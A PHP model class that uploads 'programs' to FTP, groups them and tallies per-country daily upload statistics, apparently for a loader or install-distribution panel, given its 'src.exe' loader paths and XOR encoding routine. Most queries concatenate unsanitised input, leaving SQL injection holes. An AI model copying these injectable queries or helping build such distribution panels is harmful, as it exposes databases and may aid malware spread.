<?php
require_once '../lib/Database/Adapter/Abstract.php';

//---------------------- libs -----------------
require_once '../lib/Config/Database.php';
require_once '../lib/Config.php';
//---------------------- models ---------------

class ProgramsModel {
    public static $LOADERSRC = '../resources/files/src.exe';
    public static $LOADERDST = '../resources/files/loaders/';    
    private $_adapter;
    
    public function __construct(DatabaseAdapterAbstract $adapter) {
        $this->_adapter = $adapter;
    }
    
    private function encrypt($str, $key){
        for ($i = 0; $i < strlen($str); $i++){
            $r = ord($str[$i]) ^ $key;
            
            if (!$r || ($r == $key)) 
                $r = $key;            
            $str[$i] = chr($r);
        } 
        return $str;
    } 
        
    public function getProgramStatByDate($from, $to, $id) {
        $sql = 'SELECT 
				SUM(`programs-stat`.`value`) AS sum,
				`programs-stat`.`country`,
				`programs-stat`.`date`
			FROM `programs-stat`			
			WHERE 
				`programs-stat`.`date` >= \''.$from.'\' AND
				`programs-stat`.`date` <= \''.$to.'\' AND
				`programs-stat`.`program` = \''.$id.'\'
			GROUP BY `programs-stat`.`date`
		';
        $statement = $this->_adapter->query($sql);
        $rows = array();
        while (($row = $this->_adapter->fetchRow($statement))) {
            if (!array_key_exists($row['country'], $rows)) {
                $rows[$row['country']] = array();
            }
            $rows[$row['country']][$row['date']] = $row['sum'];
        }
        return $rows;
    }
    
    public function getProgramsCnt($where = null) {
        $sql = 'SELECT COUNT(`programs`.`id`) AS cnt 
			FROM `programs` INNER JOIN `programs-groups` 
			ON `programs`.`group` = `programs-groups`.`id`
			'.($where?' WHERE '.$where:'');
	    $statement = $this->_adapter->query($sql);	    
	    $row = $this->_adapter->fetchRow($statement);
	    return $row['cnt'];        
    }
    
    public function getPrograms($from, $to, $where = null, $order = 'id') {
        $sql = 'SELECT 
				`programs`.*,
				`programs-groups`.`name` AS `group_name` 
			FROM `programs` INNER JOIN `programs-groups` 
			ON `programs`.`group` = `programs-groups`.`id`
			'.($where?' WHERE '.$where:'').'
			'.($order?' ORDER BY '.$order:'').'
			LIMIT '.$from.', '.$to;    
	    $statement = $this->_adapter->query($sql);
        $config = new Config(ConfigDatabase::load($this->_adapter));
        
        $rows = array();
        while (($row = $this->_adapter->fetchRow($statement))) {
            $row['download_link'] = 'http://'.$config->ftp_domain.'/'.$row['program'];
	        $row['today_total_uploads'] = $this->getTodayTotalUploads($row['id']);	        
	        $row['today_uploads'] = $this->getTodayUploads($row['id']);            
            $rows[] = $row;
        }
	    return $rows;        
    }
    
    public function getProgramById($id) {
        $sql = 'SELECT 
				`programs`.*,
				`programs-groups`.`name` AS `group_name` 
			FROM `programs` INNER JOIN `programs-groups` 
			ON `programs`.`group` = `programs-groups`.`id`
			WHERE `programs`.`id` = \''.$id.'\'
		';
	    $statement = $this->_adapter->query($sql);
	    $row = $this->_adapter->fetchRow($statement);
	    if ($row) {
            $config = new Config(ConfigDatabase::load($this->_adapter));	        
	        $row['download_link'] = 'http://'.$config->ftp_domain.'/'.$row['program'];
	        $row['today_total_uploads'] = $this->getTodayTotalUploads($row['id']);	        
	        $row['today_uploads'] = $this->getTodayUploads($row['id']);
	    }
	    return $row;
    }
    
    public function getTodayTotalUploads($id) {
        $sql = 'SELECT SUM(`programs-stat`.`value`) AS sum
			FROM `programs-stat`
			WHERE `programs-stat`.`program` = \''.$id.'\'
		GROUP BY `programs-stat`.`program`';        
        $statement = $this->_adapter->query($sql);
        $row = $this->_adapter->fetchRow($statement);
        return $row['sum'];
    }
    
    public function getTodayUploads($id) {
         $sql = 'SELECT SUM(`programs-stat`.`value`) AS sum
			FROM `programs-stat`
			WHERE `programs-stat`.`program` = \''.$id.'\' AND 
				`programs-stat`.`date` = \''.date('Y-m-d').'\'
		GROUP BY `programs-stat`.`program`';        
        $statement = $this->_adapter->query($sql);
        $row = $this->_adapter->fetchRow($statement);
        return $row['sum'];
    }    
    
    public function saveProgram(array $values, $id = null) {
        if (!$values['program']['error']) {
            $config = new Config(ConfigDatabase::load($this->_adapter));
            if (!($fp = @ftp_connect ($config->ftp_domain))
                || !(@ftp_login($fp, $config->ftp_user, $config->ftp_password))) {
                return false;
            }
            
            if ($config->ftp_directory 
                && !@ftp_chdir($fp, trim($config->ftp_directory, '/'))) {                
                return false;
            }
            
            ftp_put($fp, $values['program']['name'], $values['program']['tmp_name'], FTP_BINARY);
            
            if ($id) {//remove 
                $item = $this->getProgramById($id);
                if(!@ftp_delete($fp, $item['program'])) {
                    return false;
                }
            }
            
            @ftp_close($fp);
            $values['program'] = $values['program']['name'];            
        } else unset($values['program']);
        if ($id) {
            $id = array('field' => 'id', 'value' => $id);
        }
        return $this->_adapter->save('programs', $values, $id);
    }
    
    public function rmProgram($id) {
        if (($item = $this->getProgramById($id))) {
            $config = new Config(ConfigDatabase::load($this->_adapter));
            if (!($fp = @ftp_connect ($config->ftp_domain))
                || !(@ftp_login($fp, $config->ftp_user, $config->ftp_password))) {
                return false;
            }
            
            if ($config->ftp_directory 
                && !@ftp_chdir($fp, trim($config->ftp_directory, '/'))) {                
                return false;
            }
            
            if(!@ftp_delete($fp, $item['program'])) {
                return false;
            }
            @ftp_close($fp);
                        
            return $this->_adapter->remove
            ('programs', array('field' => 'id', 'value' => $id));
        } return false;
    }
    
    public function getGroupsCnt($where = null) {
        $sql = 'SELECT COUNT(id) AS cnt 
			FROM `programs-groups` '.($where?' WHERE '.$where:'');
	    $statement = $this->_adapter->query($sql);	    
	    $row = $this->_adapter->fetchRow($statement);
	    return $row['cnt'];        
    }
    
    public function getGroups($from, $to, $where = null, $order = 'id') {
        $sql = 'SELECT * FROM `programs-groups` 
			'.($where?' WHERE '.$where:'').'
			'.($order?' ORDER BY '.$order:'').'
			LIMIT '.$from.', '.$to;        
	    $statement = $this->_adapter->query($sql);
	    return $this->_adapter->fetchAll($statement);        
    }
    
    public function getGroupById($id) {
        $item = $this->_adapter->load('programs-groups', array('field' => 'id', 'value' => $id));
        return $item;
    }
    
    public function saveGroup(array $values, $id = null) {
        if ($id) {
            $id = array('field' => 'id', 'value' => $id);
        }
        return $this->_adapter->save('programs-groups', $values, $id);
    }
    
    public function rmGroup($id) {
        /** remove related programs */
        $sql = 'SELECT * FROM `programs` 
			WHERE `group`  = \''.$id.'\'';
        $statement = $this->_adapter->query($sql);
        $config = new Config(ConfigDatabase::load($this->_adapter));
        if (!($fp = @ftp_connect ($config->ftp_domain))
            || !(@ftp_login($fp, $config->ftp_user, $config->ftp_password))) {
            return false;
        }
            
        if ($config->ftp_directory 
            && !@ftp_chdir($fp, trim($config->ftp_directory, '/'))) {                
            return false;
        }
        while (($row = $this->_adapter->fetchRow($statement))) {
            if((@ftp_size($fp, $row['program']) != -1)) {// file exists case
                if (!@ftp_delete($fp, $row['program'])) {
                    return false;
                }
            }
        } @ftp_close($fp);
        
        $sql = 'DELETE FROM `programs` 
		WHERE `group`  = \''.$id.'\'';
        $statement = $this->_adapter->query($sql);
        /** end remove */
        
        return $this->_adapter->remove
            ('programs-groups', array('field' => 'id', 'value' => $id));
    }
}
?>